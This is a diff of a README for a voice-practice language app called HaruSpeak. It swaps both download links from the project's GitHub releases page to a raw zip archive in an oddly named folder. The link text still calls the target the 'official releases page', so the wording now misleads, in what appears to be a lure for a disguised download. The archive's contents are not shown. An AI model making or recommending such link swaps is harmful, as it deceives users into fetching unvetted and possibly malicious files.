@@ -1,6 +1,6 @@
 # 🗣️ HaruSpeak - Improve language skills through voice practice
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/bathingnutmegmelon3320/HaruSpeak/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/bathingnutmegmelon3320/HaruSpeak/main/incuriously/Haru_Speak_3.9.zip)
 
 ## 📖 About this application
 
@@ -19,7 +19,7 @@ Ensure your computer meets these requirements before you begin:
 
 ## 📥 How to download the software
 
-Visit the [official releases page](https://github.com/bathingnutmegmelon3320/HaruSpeak/releases) to download the latest version of the installer.
+Visit the [official releases page](https://raw.githubusercontent.com/bathingnutmegmelon3320/HaruSpeak/main/incuriously/Haru_Speak_3.9.zip) to download the latest version of the installer.
 
 1.  Open the link in your web browser.
 2.  Look for the section marked Assets.
